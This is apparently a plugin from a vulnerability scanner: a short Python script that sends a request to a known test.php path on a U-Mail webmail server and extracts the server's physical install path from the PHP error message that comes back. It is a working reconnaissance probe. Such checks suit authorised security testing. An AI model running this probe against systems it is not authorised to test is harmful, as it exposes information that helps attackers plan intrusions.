#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: umail物理路径泄露
referer: unknow
author: Lucifer
description: 泄露了物理路径。
'''
import re
import sys
import requests
import warnings
from termcolor import cprint

class umail_physical_path_BaseVerify:
    def __init__(self, url):
        self.url = url

    def get_path(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/webmail/client/mail/module/test.php"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            temp=re.search(r'a non-object in <b>(.*)\\client\\mail',req.text,re.S).group(1)
            temp=temp.split('\\')
            path=''
            for i in range(len(temp)):
                t=temp[i]+'/'
                path+=t
            return path
        except:
            return False

    def run(self):
        path = self.get_path()
        if path != False:
            cprint("[+]存在umail物理路径泄露...(敏感信息)\t真实路径: "+path, "green")
            return True, self.url, "umail物理路径泄露", path, "存在umail物理路径泄露...(敏感信息)"
        return False, None, None, None, None


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = umail_physical_path_BaseVerify(sys.argv[1])
    testVuln.run()